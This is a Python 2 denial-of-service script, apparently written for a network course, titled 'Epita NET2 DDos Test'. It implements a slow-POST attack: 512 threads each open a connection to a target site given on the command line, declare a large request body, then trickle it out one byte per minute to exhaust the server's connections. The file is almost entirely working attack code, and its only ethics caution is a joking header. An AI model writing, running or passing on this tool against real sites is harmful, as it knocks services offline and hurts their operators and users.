# USE THIS ONLY ETHICALY !! OR YOU ARE GOING TO PRISON :D

import sys
import socket
import time
import getopt
import re
from threading import Thread

class MyThread(Thread,):
    def __init__(self,SITE, DOS_TYPE):
        Thread.__init__(self)
        self.method = DOS_TYPE
        self.site = SITE
        self.kill_received = False
    def run(self):
        while not self.kill_received:
            server = socket.gethostbyname(self.site)
            post = 'x' * 9999
            file = '/'

            request = '%s /%s HTTP/1.1\r\n' %(self.method.upper(),file)
            request += 'Host: %s\r\n' % (self.site)
            request += 'User-Agent: Mozilla/5.0 (Windows; U;Windows NT 6.1; en-US; rv:1.9.2.12) Gecko/20101026Firefox/3.6.12\r\n'
            request += 'Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n'
            request += 'Accept-Language: en-us,en;q=0.5\r\n'
            request += 'Accept-Encoding: gzip,deflate\r\n'
            request += 'Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n'
            request += 'Keep-Alive: 9000\r\n'
            request += 'Connection: close\r\n'
            request += 'Content-Type: application/x-www-form-urlencoded\r\n'
            request += 'Content-length: %s\r\n\r\n' % (len(post))

            newrequest = '%s\r\n' % (post)
            newrequest += '\r\n'

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            try:
                s.connect((server, 80))
                s.send(request)

                for c in newrequest:
                    sys.stdout.write( s.send(c).__str__() )
                    time.sleep(60)
                s.close()
            except:
                print "Target Down?"

def da_delegator(SITE,DOS_TYPE):
    thread_count = 512
    print 'Hola From Epita NET2 DDos Test'.center(60,'-')
    threads = []
    for num in range(thread_count):
        thr1=MyThread(SITE,DOS_TYPE)
        print 'start - %s' % thr1
        thr1.start()
        threads.append(thr1)
        #thr1.join()

    while len(threads) > 0:
            try:
                threads = [t.join(1) for t in threads if t is not
None and t.isAlive()]
            except KeyboardInterrupt:
                print "Ctrl-c received! Sending kill to threads..."
                for t in threads:
                    t.kill_received = True
                    sys.exit(2)

def main(argv):
    def usage():
        print '=' * 60
        print 'Hola From Epita NET2 DDos Test'.center(60,'-')
        print '=' * 60
        sys.exit(2)
    if not argv:
        usage()
    try:
        opts, args = getopt.getopt(sys.argv[1:], "t:h", ["help",
"type"])
    except getopt.GetoptError, err:
        print str(err)
        sys.exit(2)
    output = None
    verbose = False
    SITE = re.sub(r'http://', '', str(sys.argv[-1:][0]))

    for o, a in opts:
        if o == "-v":
            verbose = True
        elif o in ("-t", "--type"):
            if a.lower() == 'post':
                DOS_TYPE = 'POST'
                da_delegator(SITE,DOS_TYPE)
            elif a.lower() =='get':
                DOS_TYPE = 'get'
                da_delegator(SITE,DOS_TYPE)
        elif o in ("-h", "--help"):
            usage()
            sys.exit()
        else:
            assert False, "unhandled option"

if __name__=="__main__":
    main(sys.argv[1:])
